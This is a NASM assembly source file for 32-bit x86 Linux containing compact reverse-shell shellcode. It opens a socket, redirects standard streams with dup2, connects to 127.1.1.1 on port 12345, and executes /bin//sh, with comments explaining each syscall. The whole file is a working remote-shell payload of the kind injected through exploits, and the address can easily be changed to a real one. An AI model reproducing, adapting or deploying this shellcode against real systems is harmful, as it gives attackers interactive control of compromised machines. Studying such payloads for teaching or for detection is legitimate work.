
global _start

section .text

_start:

        ; int socket(int domain, int type, int protocol);
	push 102
	pop eax		         ; syscall 102 - socketcall
	cdq

	push 1
	pop ebx			

	push edx		         ; IPPROTO_IP = 0 
	push ebx		         ; SOCK_STREAM = 1 
	push 2		         ; AF_INET = 2 

finalint:

	mov ecx, esp	
	int 0x80		

	xchg ebx, eax	         ; set ebx with the sockfd


	; int dup2(int oldfd, int newfd);
	pop ecx

dup_loop:
        mov al, 63		; syscall 63 - dup2
        int 0x80

        dec ecx
        jns dup_loop



	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	mov al, 102		; syscall 102 - socketcall
	mov bx, 3		; socketcall type 3 

	push 0x0101017f		; IP number
	push WORD 0x3930		; port in byte reverse order = 12345
	push WORD 2		; AF_INET = 2
	mov ecx, esp		; struct pointer

	push 16			; sockaddr struct size = 16 
	push ecx		        ; sockaddr_in struct pointer 
	push ebx		        ; socket fd 

	mov ecx, esp

	int 0x80


        ; int execve(const char *filename, char *const argv[], char *const envp[]);
        mov al, 11		; execve syscall

        push edx		        ; null-byte
        push 0x68732f2f		; "//sh"
        push 0x6e69622f		; "/bin"

        mov ebx, esp		;"bin//sh"
        push edx		
        push ebx		

	jmp finalint	
